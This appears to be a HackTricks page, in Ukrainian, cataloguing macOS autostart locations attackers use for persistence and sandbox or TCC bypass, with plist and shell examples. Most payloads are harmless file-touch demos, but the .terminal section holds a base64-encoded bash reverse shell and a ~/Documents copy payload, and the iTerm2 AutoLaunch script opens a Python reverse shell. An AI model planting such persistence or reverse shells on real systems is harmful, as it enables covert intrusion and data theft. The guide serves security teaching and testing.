# macOS Автозапуск

{{#include ../banners/hacktricks-training.md}}

Цей розділ значною мірою базується на серії блогів [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), мета полягає в тому, щоб додати **більше місць автозапуску** (якщо можливо), вказати **які техніки все ще працюють** сьогодні з останньою версією macOS (13.4) і вказати **необхідні дозволи**.

## Обхід пісочниці

> [!TIP]
> Тут ви можете знайти місця запуску, корисні для **обходу пісочниці**, які дозволяють вам просто виконати щось, **записавши це у файл** і **чекаючи** на дуже **поширену** **дію**, визначену **кількість часу** або **дію, яку ви зазвичай можете виконати** зсередини пісочниці без необхідності в кореневих дозволах.

### Launchd

- Корисно для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Місця

- **`/Library/LaunchAgents`**
- **Тригер**: Перезавантаження
- Потрібен root
- **`/Library/LaunchDaemons`**
- **Тригер**: Перезавантаження
- Потрібен root
- **`/System/Library/LaunchAgents`**
- **Тригер**: Перезавантаження
- Потрібен root
- **`/System/Library/LaunchDaemons`**
- **Тригер**: Перезавантаження
- Потрібен root
- **`~/Library/LaunchAgents`**
- **Тригер**: Повторний вхід
- **`~/Library/LaunchDemons`**
- **Тригер**: Повторний вхід

> [!TIP]
> Як цікава деталь, **`launchd`** має вбудований список властивостей у секції Mach-o `__Text.__config`, який містить інші добре відомі сервіси, які launchd повинен запустити. Більше того, ці сервіси можуть містити `RequireSuccess`, `RequireRun` і `RebootOnSuccess`, що означає, що вони повинні бути запущені і завершені успішно.
>
> Звичайно, його не можна змінити через підписування коду.

#### Опис та експлуатація

**`launchd`** є **першим** **процесом**, який виконується ядром OX S під час запуску, і останнім, що завершується під час вимкнення. Він завжди повинен мати **PID 1**. Цей процес буде **читати та виконувати** конфігурації, вказані в **ASEP** **plist** у:

- `/Library/LaunchAgents`: Агенти для користувача, встановлені адміністратором
- `/Library/LaunchDaemons`: Системні демони, встановлені адміністратором
- `/System/Library/LaunchAgents`: Агенти для користувача, надані Apple.
- `/System/Library/LaunchDaemons`: Системні демони, надані Apple.

Коли користувач входить, plist, розташовані в `/Users/$USER/Library/LaunchAgents` і `/Users/$USER/Library/LaunchDemons`, запускаються з **дозволами увійшовших користувачів**.

**Головна різниця між агентами та демонами полягає в тому, що агенти завантажуються, коли користувач входить, а демони завантажуються під час запуску системи** (оскільки є сервіси, такі як ssh, які потрібно виконати до того, як будь-який користувач отримує доступ до системи). Також агенти можуть використовувати GUI, тоді як демони повинні працювати у фоновому режимі.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Є випадки, коли **агент має бути виконаний до входу користувача**, ці агенти називаються **PreLoginAgents**. Наприклад, це корисно для надання допоміжних технологій під час входу. Їх також можна знайти в `/Library/LaunchAgents`(див. [**тут**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) приклад).

> [!NOTE]
> Нові конфігураційні файли Daemons або Agents будуть **завантажені після наступного перезавантаження або за допомогою** `launchctl load <target.plist>` Також **можливо завантажити .plist файли без цього розширення** за допомогою `launchctl -F <file>` (однак ці plist файли не будуть автоматично завантажені після перезавантаження).\
> Також можливо **вивантажити** за допомогою `launchctl unload <target.plist>` (процес, на який він вказує, буде завершено),
>
> Щоб **переконатися**, що немає **нічого** (як-от перевага), що **перешкоджає** **агенту** або **демону** **виконуватися**, виконайте: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Перерахуйте всі агенти та демони, завантажені поточним користувачем:
```bash
launchctl list
```
> [!WARNING]
> Якщо plist належить користувачу, навіть якщо він знаходиться в системних папках демонів, **задача буде виконана як користувач** і не як root. Це може запобігти деяким атакам підвищення привілеїв.

#### Більше інформації про launchd

**`launchd`** є **першим** процесом у режимі користувача, який запускається з **ядра**. Запуск процесу повинен бути **успішним** і він **не може завершитися або аварійно зупинитися**. Він навіть **захищений** від деяких **сигналів завершення**.

Однією з перших речей, які зробить `launchd`, є **запуск** всіх **демонів**, таких як:

- **Демони таймера**, які виконуються за часом:
- atd (`com.apple.atrun.plist`): Має `StartInterval` 30 хвилин
- crond (`com.apple.systemstats.daily.plist`): Має `StartCalendarInterval`, щоб почати о 00:15
- **Мережеві демони**, такі як:
- `org.cups.cups-lpd`: Слухає в TCP (`SockType: stream`) з `SockServiceName: printer`
- SockServiceName повинен бути або портом, або службою з `/etc/services`
- `com.apple.xscertd.plist`: Слухає на TCP на порту 1640
- **Демони шляху**, які виконуються, коли змінюється вказаний шлях:
- `com.apple.postfix.master`: Перевіряє шлях `/etc/postfix/aliases`
- **Демони сповіщень IOKit**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach порт:**
- `com.apple.xscertd-helper.plist`: Вказує в запису `MachServices` ім'я `com.apple.xscertd.helper`
- **UserEventAgent:**
- Це відрізняється від попереднього. Він змушує launchd запускати програми у відповідь на певні події. Однак у цьому випадку основний бінарний файл, що бере участь, не є `launchd`, а `/usr/libexec/UserEventAgent`. Він завантажує плагіни з обмеженої папки SIP /System/Library/UserEventPlugins/, де кожен плагін вказує свій ініціалізатор у ключі `XPCEventModuleInitializer` або, у випадку старіших плагінів, у словнику `CFPluginFactories` під ключем `FB86416D-6164-2070-726F-70735C216EC0` його `Info.plist`.

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Корисно для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Але вам потрібно знайти додаток з обходом TCC, який виконує оболонку, що завантажує ці файли

#### Локації

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Тригер**: Відкрити термінал з zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Тригер**: Відкрити термінал з zsh
- Потрібен root
- **`~/.zlogout`**
- **Тригер**: Вийти з терміналу з zsh
- **`/etc/zlogout`**
- **Тригер**: Вийти з терміналу з zsh
- Потрібен root
- Потенційно більше в: **`man zsh`**
- **`~/.bashrc`**
- **Тригер**: Відкрити термінал з bash
- `/etc/profile` (не спрацювало)
- `~/.profile` (не спрацювало)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Тригер**: Очікується, що спрацює з xterm, але він **не встановлений** і навіть після встановлення виникає ця помилка: xterm: `DISPLAY is not set`

#### Опис та експлуатація

При ініціалізації середовища оболонки, такого як `zsh` або `bash`, **виконуються певні файли запуску**. macOS наразі використовує `/bin/zsh` як оболонку за замовчуванням. Ця оболонка автоматично відкривається, коли запускається програма Terminal або коли пристрій доступний через SSH. Хоча `bash` і `sh` також присутні в macOS, їх потрібно явно викликати для використання.

Сторінка man для zsh, яку ми можемо прочитати за допомогою **`man zsh`**, має довгий опис файлів запуску.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Відкриті знову програми

> [!CAUTION]
> Налаштування вказаного експлуатаційного коду та виходу з системи і повторного входу або навіть перезавантаження не спрацювало для мене, щоб виконати додаток. (Додаток не виконувався, можливо, він повинен бути запущеним, коли виконуються ці дії)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Корисно для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Місцезнаходження

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Тригер**: Перезапуск відкриття програм

#### Опис та експлуатація

Всі програми для повторного відкриття знаходяться всередині plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Отже, щоб змусити повторно відкриті програми запускати вашу, вам просто потрібно **додати ваш додаток до списку**.

UUID можна знайти, перерахувавши цю директорію або за допомогою `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Щоб перевірити програми, які будуть повторно відкриті, ви можете зробити:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Щоб **додати додаток до цього списку**, ви можете використовувати:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Налаштування терміналу

- Корисно для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
- Термінал має дозволи FDA користувача, який його використовує

#### Розташування

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Тригер**: Відкрити Термінал

#### Опис та експлуатація

У **`~/Library/Preferences`** зберігаються налаштування користувача в програмах. Деякі з цих налаштувань можуть містити конфігурацію для **виконання інших програм/скриптів**.

Наприклад, Термінал може виконати команду при запуску:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Ця конфігурація відображається у файлі **`~/Library/Preferences/com.apple.Terminal.plist`** ось так:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Отже, якщо plist налаштувань терміналу в системі може бути перезаписаний, то функціональність **`open`** може бути використана для **відкриття терміналу, і ця команда буде виконана**.

Ви можете додати це з cli за допомогою:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Інші розширення файлів

- Корисно для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
- Використання терміналу для отримання дозволів FDA користувача

#### Місцезнаходження

- **Де завгодно**
- **Тригер**: Відкрити Термінал

#### Опис та експлуатація

Якщо ви створите [**`.terminal`** скрипт](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) і відкриєте його, **додаток Термінал** буде автоматично викликаний для виконання вказаних там команд. Якщо додаток Термінал має якісь спеціальні привілеї (такі як TCC), ваша команда буде виконана з цими спеціальними привілеями.

Спробуйте це з:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Ви також можете використовувати розширення **`.command`**, **`.tool`**, з вмістом звичайних оболонкових скриптів, і вони також будуть відкриті в Terminal.

> [!CAUTION]
> Якщо термінал має **Повний доступ до диска**, він зможе виконати цю дію (зверніть увагу, що виконана команда буде видна у вікні терміналу).

### Аудіоплагіни

Написання: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Написання: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Корисно для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Ви можете отримати додатковий доступ до TCC

#### Локація

- **`/Library/Audio/Plug-Ins/HAL`**
- Потрібен root
- **Тригер**: Перезапустіть coreaudiod або комп'ютер
- **`/Library/Audio/Plug-ins/Components`**
- Потрібен root
- **Тригер**: Перезапустіть coreaudiod або комп'ютер
- **`~/Library/Audio/Plug-ins/Components`**
- **Тригер**: Перезапустіть coreaudiod або комп'ютер
- **`/System/Library/Components`**
- Потрібен root
- **Тригер**: Перезапустіть coreaudiod або комп'ютер

#### Опис

Згідно з попередніми написаннями, можливо **скомпілювати деякі аудіоплагіни** та завантажити їх.

### Плагіни QuickLook

Написання: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Корисно для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Ви можете отримати додатковий доступ до TCC

#### Локація

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Опис та експлуатація

Плагіни QuickLook можуть бути виконані, коли ви **тригерите попередній перегляд файлу** (натисніть пробіл, вибравши файл у Finder) і **плагін, що підтримує цей тип файлу**, встановлений.

Можливо скомпілювати свій власний плагін QuickLook, помістити його в одне з попередніх місць для завантаження, а потім перейти до підтримуваного файлу та натиснути пробіл, щоб тригерити його.

### ~~Хуки входу/виходу~~

> [!CAUTION]
> Це не спрацювало для мене, ні з LoginHook користувача, ні з LogoutHook root

**Написання**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Корисно для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Локація

- Вам потрібно мати можливість виконати щось на зразок `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- `Lo`ковано в `~/Library/Preferences/com.apple.loginwindow.plist`

Вони застаріли, але можуть бути використані для виконання команд, коли користувач входить в систему.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Ця налаштування зберігається в `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Щоб видалити це:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Користувач root зберігається в **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Умовний обхід пісочниці

> [!TIP]
> Тут ви можете знайти місця запуску, корисні для **обходу пісочниці**, які дозволяють вам просто виконати щось, **записуючи це у файл** і **очікуючи не надто поширені умови**, такі як специфічні **встановлені програми, "незвичайні" дії користувача** або середовища.

### Cron

**Запис**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Корисно для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
- Однак, вам потрібно мати можливість виконати бінарний файл `crontab`
- Або бути root
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Місцезнаходження

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Потрібен root для прямого доступу на запис. Root не потрібен, якщо ви можете виконати `crontab <file>`
- **Тригер**: Залежить від cron завдання

#### Опис та експлуатація

Перелічіть cron завдання **поточного користувача** за допомогою:
```bash
crontab -l
```
Ви також можете переглянути всі cron-завдання користувачів у **`/usr/lib/cron/tabs/`** та **`/var/at/tabs/`** (потрібні права root).

У MacOS кілька папок, які виконують скрипти з **певною частотою**, можна знайти в:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Там ви можете знайти звичайні **cron** **завдання**, **at** **завдання** (не дуже використовуються) та **періодичні** **завдання** (в основному використовуються для очищення тимчасових файлів). Щоденні періодичні завдання можна виконати, наприклад, за допомогою: `periodic daily`.

Щоб додати **користувацьке cron-завдання програмно**, можна використовувати:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Корисно для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 раніше мав надані дозволи TCC

#### Locations

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Trigger**: Відкрити iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Trigger**: Відкрити iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Trigger**: Відкрити iTerm

#### Description & Exploitation

Скрипти, збережені в **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**, будуть виконані. Наприклад:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
або:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Скрипт **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** також буде виконано:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Налаштування iTerm2, розташоване в **`~/Library/Preferences/com.googlecode.iterm2.plist`**, може **вказувати команду для виконання** при відкритті терміналу iTerm2.

Це налаштування можна налаштувати в налаштуваннях iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

І команда відображається в налаштуваннях:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Ви можете встановити команду для виконання за допомогою:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Висока ймовірність, що є **інші способи зловживання налаштуваннями iTerm2** для виконання довільних команд.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Корисно для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
- Але xbar повинен бути встановлений
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
- Він запитує дозволи на доступ до елементів керування

#### Location

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: Як тільки xbar буде виконано

#### Description

Якщо популярна програма [**xbar**](https://github.com/matryer/xbar) встановлена, можна написати shell-скрипт у **`~/Library/Application\ Support/xbar/plugins/`**, який буде виконано при запуску xbar:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Корисно для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
- Але Hammerspoon повинен бути встановлений
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
- Він запитує дозволи на доступність

#### Location

- **`~/.hammerspoon/init.lua`**
- **Trigger**: Як тільки hammerspoon буде виконано

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) слугує платформою автоматизації для **macOS**, використовуючи **LUA scripting language** для своїх операцій. Зокрема, він підтримує інтеграцію повного коду AppleScript та виконання shell-скриптів, значно розширюючи свої можливості сценаріїв.

Додаток шукає один файл, `~/.hammerspoon/init.lua`, і при запуску скрипт буде виконано.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Корисно для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
- Але BetterTouchTool повинен бути встановлений
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
- Він запитує дозволи на Автоматизацію-Шорткоти та Доступність

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

Цей інструмент дозволяє вказувати програми або скрипти для виконання, коли натискаються певні шорткоти. Зловмисник може налаштувати свій власний **шорткат і дію для виконання в базі даних**, щоб виконати довільний код (шорткат може бути просто натисканням клавіші).

### Alfred

- Корисно для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
- Але Alfred повинен бути встановлений
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
- Він запитує дозволи на Автоматизацію, Доступність і навіть Доступ до всього диска

#### Location

- `???`

Це дозволяє створювати робочі процеси, які можуть виконувати код, коли виконуються певні умови. Потенційно зловмисник може створити файл робочого процесу і змусити Alfred завантажити його (необхідно оплатити преміум-версію для використання робочих процесів).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Корисно для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
- Але ssh потрібно увімкнути та використовувати
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
- Використання SSH для доступу FDA

#### Location

- **`~/.ssh/rc`**
- **Trigger**: Вхід через ssh
- **`/etc/ssh/sshrc`**
- Потрібен root
- **Trigger**: Вхід через ssh

> [!CAUTION]
> Щоб увімкнути ssh, потрібен Доступ до всього диска:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description & Exploitation

За замовчуванням, якщо в `/etc/ssh/sshd_config` не вказано `PermitUserRC no`, коли користувач **входить через SSH**, скрипти **`/etc/ssh/sshrc`** та **`~/.ssh/rc`** будуть виконані.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Корисно для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
- Але потрібно виконати `osascript` з аргументами
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Вхід
- Вразливий вантаж зберігається, викликаючи **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Вхід
- Потрібен root

#### Description

У Системних налаштуваннях -> Користувачі та групи -> **Елементи входу** ви можете знайти **елементи, які виконуються, коли користувач входить**.\
Можна їх перерахувати, додавати та видаляти з командного рядка:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Ці елементи зберігаються у файлі **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Елементи входу** також можуть бути вказані за допомогою API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc), який зберігає конфігурацію у **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP як елемент входу

(Дивіться попередній розділ про елементи входу, це розширення)

Якщо ви зберігаєте **ZIP** файл як **елемент входу**, **`Archive Utility`** відкриє його, і якщо zip, наприклад, був збережений у **`~/Library`** і містив папку **`LaunchAgents/file.plist`** з бекдором, ця папка буде створена (вона не створюється за замовчуванням) і plist буде додано, тому наступного разу, коли користувач знову увійде, **бекдор, вказаний у plist, буде виконано**.

Інший варіант - створити файли **`.bash_profile`** та **`.zshenv** всередині домашньої директорії користувача, тому якщо папка LaunchAgents вже існує, ця техніка все ще буде працювати.

### At

Написання: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Корисно для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
- Але вам потрібно **виконати** **`at`** і він повинен бути **увімкнений**
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Місцезнаходження

- Потрібно **виконати** **`at`** і він повинен бути **увімкнений**

#### **Опис**

Завдання `at` призначені для **планування одноразових завдань** для виконання в певний час. На відміну від cron-завдань, завдання `at` автоматично видаляються після виконання. Важливо зазначити, що ці завдання зберігаються між перезавантаженнями системи, що робить їх потенційною загрозою безпеці за певних умов.

За **замовчуванням** вони **вимкнені**, але **користувач root** може **увімкнути** **їх** за допомогою:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Це створить файл за 1 годину:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Перевірте чергу завдань за допомогою `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Вище ми можемо побачити два заплановані завдання. Ми можемо надрукувати деталі завдання, використовуючи `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Якщо завдання AT не ввімкнені, створені завдання не будуть виконані.

Файли **завдань** можна знайти за адресою `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Назва файлу містить чергу, номер завдання та час, коли воно заплановане для виконання. Наприклад, розглянемо `a0001a019bdcd2`.

- `a` - це черга
- `0001a` - номер завдання в шістнадцятковій системі, `0x1a = 26`
- `019bdcd2` - час у шістнадцятковій системі. Він представляє хвилини, що пройшли з епохи. `0x019bdcd2` - це `26991826` у десятковій системі. Якщо помножити його на 60, отримаємо `1619509560`, що є `GMT: 2021. April 27., Tuesday 7:46:00`.

